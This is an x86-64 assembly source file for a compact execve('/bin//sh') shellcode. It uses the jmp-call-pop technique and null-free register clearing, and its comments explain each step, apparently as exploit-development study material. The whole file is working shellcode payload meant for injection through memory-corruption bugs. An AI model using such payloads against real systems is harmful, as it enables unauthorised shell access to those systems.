global _start

section .text
_start:
    jmp short shell_str     ; jmp-call-pop technique

pop_rsi:
    pop rsi                 ; Source: "/bin//sh"

mov_string:
    ; Clears both rcx & rdi register
    xor rcx, rcx
    xor rdi, rdi

    ; Reserving total of 16 bytes for "/bin//sh" and NULL terminator
    push rcx                ; For NULL terminator
    push rcx                ; For "/bin//sh"
    lea rdi, [rsp]          ; Destination: Buffer

    mov cl, count           ; Length of string
    rep movsb               ; Move byte by byte till count is 0

pop_shell:
    ; [ ptr to "/bin//sh" | NULL | "/bin//sh" ]
    mov rdi, rsp            ; 1st arg : "/bin//sh"
    push rcx                ; NULL terminator
    push rdi                ; ptr to "/bin//sh"
    mov rsi, rsp            ; 2nd arg: ptr to "/bin//sh"
    xor rdx, rdx            ; 3rd arg: NULL
    
    xor rax, rax            ; Clearing register for loading of syscall #
    add al, 59              ; Syscall # for execve()
    syscall

shell_str:
    call pop_rsi            ; When call is used, address of binSH is saved into the stack
    binSH: db '/bin//sh'
    count: equ $-binSH
